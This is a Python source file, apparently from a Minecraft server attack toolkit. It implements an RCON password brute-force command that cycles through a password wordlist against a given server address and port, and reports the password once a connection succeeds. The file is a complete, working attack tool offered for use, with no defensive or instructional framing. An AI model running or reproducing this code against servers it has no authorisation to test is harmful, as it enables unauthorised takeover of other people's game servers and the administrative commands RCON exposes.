import time
import os

from mcrcon_mcpt.mcrcon import MCRcon, MCRconException

from src.decoration.paint import paint
from src.utilities.get_utilities import GetUtilities
from src.utilities.check_utilities import CheckUtilities


def rconbrute(server, password_file, *args):
    """
    Perform an RCON brute-force attack on a Minecraft server using a list of passwords.

    Args:
        server (str): The IP address and port of the Minecraft RCON server.
        password_file (str): The path to a file containing a list of passwords to try.
        *args: Additional arguments (not used in this function).
    """

    try:
        # Initialize flags and variables
        attack_finished = False
        password_found = False
        password = ''

        # Check if the provided password file exists
        if not os.path.exists(password_file):
            paint(f'\n{GetUtilities.get_spaces()}{GetUtilities.get_translated_text(["prefix"])}{GetUtilities.get_translated_text(["commands", "invalidArguments", "invalidFile"]).replace("[0]", password_file)}')
            return
        
        if not CheckUtilities.check_ip_port(server):
            paint(f'\n{GetUtilities.get_spaces()}{GetUtilities.get_translated_text(["prefix"])}{GetUtilities.get_translated_text(["commands", "invalidArguments", "InvalidRconFormat"])}')
            return
    
        # Display a message indicating that the RCON brute-force attack is being prepared
        paint(f'\n{GetUtilities.get_spaces()}{GetUtilities.get_translated_text(["prefix"])}{GetUtilities.get_translated_text(["commands", "rconbrute", "preparingTheAttack"])}')
        time.sleep(1)

        # Read passwords from the specified file
        with open(password_file, 'r', encoding=CheckUtilities.check_file_encoding(password_file)) as f:
            passwords = f.readlines()

        # Check if the password file is empty
        if len(passwords) == 0:
            paint(f'\n{GetUtilities.get_spaces()}{GetUtilities.get_translated_text(["prefix"])}{GetUtilities.get_translated_text(["commands", "sendcmd", "emptyFile"])}')
            return
        
        # Display the number of passwords loaded for the attack
        paint(f'\n{GetUtilities.get_spaces()}{GetUtilities.get_translated_text(["prefix"])}{GetUtilities.get_translated_text(["commands", "rconbrute", "numberOfPasswords"]).replace("[0]", password_file).replace("[1]", str(len(passwords)))}')
        time.sleep(1)

        # Display a message indicating that the RCON brute-force attack is starting
        paint(f'\n{GetUtilities.get_spaces()}{GetUtilities.get_translated_text(["prefix"])}{GetUtilities.get_translated_text(["commands", "rconbrute", "startingTheAttack"])}')
        time.sleep(1)

        # Split the server address and port
        server = server.split(':')

        while True:
            if attack_finished:
                if password_found:
                    # Display a message if the correct password is found
                    paint(f'\n{GetUtilities.get_spaces()}{GetUtilities.get_translated_text(["prefix"])}{GetUtilities.get_translated_text(["commands", "rconbrute", "passwordFound"]).replace("[0]", password)}')

                else:
                    # Display a message if the attack finishes without finding the correct password
                    paint(f'\n{GetUtilities.get_spaces()}{GetUtilities.get_translated_text(["prefix"])}{GetUtilities.get_translated_text(["commands", "rconbrute", "passwordNotFound"])}')

                break

            for password in passwords:
                password = password.replace('\n', '')
                # Display a message indicating the password being tried
                paint(f'\n{GetUtilities.get_spaces()}{GetUtilities.get_translated_text(["prefix"])}{GetUtilities.get_translated_text(["commands", "rconbrute", "tryingPassword"]).replace("[0]", password)}')

                try:
                    with MCRcon(server[0], password, int(server[1]), timeout=35) as mcr:
                        mcr.disconnect()
                    
                    password_found = True
                    break

                except MCRconException:
                    continue

            attack_finished = True

    except TimeoutError:
        # Handle a timeout error gracefully
        paint(f'\n{GetUtilities.get_spaces()}{GetUtilities.get_translated_text(["prefix"])}{GetUtilities.get_translated_text(["commands", "rconbrute", "timeout"])}')

    except ConnectionRefusedError:
        # Handle a connection refused error gracefully
        paint(f'\n{GetUtilities.get_spaces()}{GetUtilities.get_translated_text(["prefix"])}{GetUtilities.get_translated_text(["commands", "rconbrute", "connectionRefused"])}')

    except Exception as e:
        # Handle other exceptions and display the error message
        paint(f'\n{GetUtilities.get_spaces()}{GetUtilities.get_translated_text(["prefix"])}{GetUtilities.get_translated_text(["commands", "rconbrute", "error"]).replace("[0]", str(e))}')
                
    except KeyboardInterrupt:
        # Handle keyboard interruption gracefully.
        paint(f'\n{GetUtilities.get_spaces()}{GetUtilities.get_translated_text(["commands", "ctrlC"])}')
